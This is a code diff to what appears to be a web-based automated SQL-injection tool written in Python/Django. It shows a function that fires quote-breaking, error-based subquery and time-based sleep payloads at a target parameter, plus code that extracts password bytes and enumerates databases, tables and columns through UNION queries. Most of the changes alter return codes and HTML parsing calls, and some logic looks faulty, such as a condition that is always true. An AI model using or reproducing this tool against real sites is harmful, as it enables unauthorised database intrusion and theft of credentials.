@@ -27,7 +27,7 @@ def checkAttackAble(dicQuery):
                 attack_querys += result[1] + '\n'
                 start[name] = str(dicQuery['parameter']) + "'"
                 print(1, attack_querys, start)
-                return 1, attack_querys, start
+                return 2, attack_querys, start
 
             else:
                 res = sendQuery(dicQuery, {
@@ -39,7 +39,7 @@ def checkAttackAble(dicQuery):
                     attack_querys += result[1] + '\n'
                     start[name] = str(dicQuery['parameter']) + "'"
                     print(2, attack_querys, start)
-                    return 1, attack_querys, start
+                    return 2, attack_querys, start
                 else :
                     res = sendQuery(dicQuery, {
                         name: dicQuery['parameter'] + f"'	||	1	in	(1)--	"})
@@ -47,7 +47,7 @@ def checkAttackAble(dicQuery):
                     if result[0] == 1:
                         attack_querys += result[1] + '\n'
                         start[name] = str(dicQuery['parameter']) + "'"
-                        return 1, attack_querys, start
+                        return 2, attack_querys, start
 
 
         for i in range(1, 3):
@@ -59,7 +59,7 @@ def checkAttackAble(dicQuery):
                 attack_querys += result[1] + '\n'
                 start[name] = str(dicQuery['parameter']) + '"'
                 print(3, attack_querys, start)
-                return 2, attack_querys, start
+                return 1, attack_querys, start
             else:
                 res = sendQuery(dicQuery, {
                     name: dicQuery['parameter'] + f'"	||	1={i}--	' })
@@ -70,7 +70,7 @@ def checkAttackAble(dicQuery):
                     flag = 1
                     start[name] = str(dicQuery['parameter']) + '"'
                     print(4, attack_querys, start)
-                    return 2, attack_querys, start
+                    return 1, attack_querys, start
                 else:
                     res = sendQuery(dicQuery, {
                         name: dicQuery['parameter'] + f'"	||	1	in	(1)--	'})
@@ -78,7 +78,7 @@ def checkAttackAble(dicQuery):
                     if result[0] == 1:
                         attack_querys += result[1] + '\n'
                         start[name] = str(dicQuery['parameter']) + '"'
-                        return 2, attack_querys, start
+                        return 1, attack_querys, start
 
         for i in range(1, 3):
             res = sendQuery(dicQuery, {
@@ -166,12 +166,12 @@ def checkAttackAble(dicQuery):
         res = sendQuery(dicQuery, {
             name: dicQuery['parameter'] + f'"	&&	if(0,1,(select	1	union	select	2))#'})
         bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.text():
+        if 'Subquery' in bs.get_text():
             attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
                 name: dicQuery['parameter'] + f'"	&&	if(1,1,(select	1	union	select	2))#'})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.text():
+            if not 'Subquery' in bs.get_text():
                 attack_querys += res.url + '\n'
                 start[name] = str(dicQuery['parameter']) + '"'
                 return 4, attack_querys, start
@@ -179,12 +179,12 @@ def checkAttackAble(dicQuery):
         res = sendQuery(dicQuery, {
             name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
         bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.text():
+        if 'Subquery' in bs.get_text():
             attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
                 name: dicQuery['parameter'] + f"'	&&	if(1,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.text():
+            if not 'Subquery' in bs.get_text():
                 attack_querys += res.url + '\n'
                 start[name] = str(dicQuery['parameter']) + "'"
                 return 5, attack_querys, start
@@ -192,12 +192,12 @@ def checkAttackAble(dicQuery):
         res = sendQuery(dicQuery, {
             name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
         bs = BeautifulSoup(res.text, 'html.parser')
-        if 'Subquery' in bs.text():
+        if 'Subquery' in bs.get_text():
             attack_querys += res.url + '\n'
             res = sendQuery(dicQuery, {
                 name: dicQuery['parameter'] + f"	&&	if(1,1,(select	1	union	select	2))#"})
             bs = BeautifulSoup(res.text, 'html.parser')
-            if not 'Subquery' in bs.text():
+            if not 'Subquery' in bs.get_text():
                 attack_querys += res.url + '\n'
                 start[name] = str(dicQuery['parameter']) + "'"
                 return 6, attack_querys, start
@@ -209,12 +209,12 @@ def checkAttackAble(dicQuery):
             name: dicQuery['parameter'] + f'"	||	1=1	&&	sleep(10)--	'})
         if res == 1 :
             start[name] = str(dicQuery['parameter']) + '"'
-            return 2, attack_querys, start
+            return 1, attack_querys, start
         res = sendQuery2(dicQuery, {
             name: dicQuery['parameter'] + f"'	||	1=1	&&	sleep(10)--	"})
         if res == 1:
             start[name] = str(dicQuery['parameter']) + "'"
-            return 1, attack_querys, start
+            return 2, attack_querys, start
         res = sendQuery2(dicQuery, {
             name: dicQuery['parameter'] + f"	||	1=1	&&	sleep(10)--	"})
         if res == 1:
@@ -225,12 +225,12 @@ def checkAttackAble(dicQuery):
             name: dicQuery['parameter'] + f'"	&&	1=1	&&	sleep(10)--	'})
         if res == 1:
             start[name] = str(dicQuery['parameter']) + '"'
-            return 2, attack_querys, start
+            return 1, attack_querys, start
         res = sendQuery2(dicQuery, {
             name: dicQuery['parameter'] + f"'	&&	1=1	&&	sleep(10)--	"})
         if res == 1:
             start[name] = str(dicQuery['parameter']) + "'"
-            return 1, attack_querys, start
+            return 2, attack_querys, start
         res = sendQuery2(dicQuery, {
             name: dicQuery['parameter'] + f"	&&	1=1	&&	sleep(10)--	"})
         if res == 1:
@@ -260,10 +260,12 @@ def retry(request):
 
         for i in check_union:
             if i in query :
+                flag = 1
                 obj, is_created = list.objects.get_or_create(query=query,stand='union')
                 break
 
-        else : obj, is_created = list.objects.get_or_create(query=query,stand='query')
+        if flag == 0:
+            obj, is_created = list.objects.get_or_create(query=query,stand='query')
 
 
         a,testtest = exploit2(python_dict, obj)
@@ -1131,7 +1133,7 @@ def main(request):
                             pw_tmp, value = hex(start, user_query, value, length, know, st)
                             if pw_tmp != '\x00\x00\x00\x00\x00\x00\x00\x00' or pw_tmp != '        ' or pw_tmp != '                ' or pw_tmp != '                        ' or pw_tmp != '':
                                 pw[know] = pw_tmp
-
+                        '''
 
                         column_cnt,db_name = db_union(user_query,start)
                         print(db_name)
@@ -1139,6 +1141,7 @@ def main(request):
                             table = table_name(user_query,start,db_name)
                             if table != '' :
                                 column = column_name(user_query,start,table)
+                                '''
 
                         # b,url = union(url, cookie, find, name, method, parameter, result,flag,start)
 
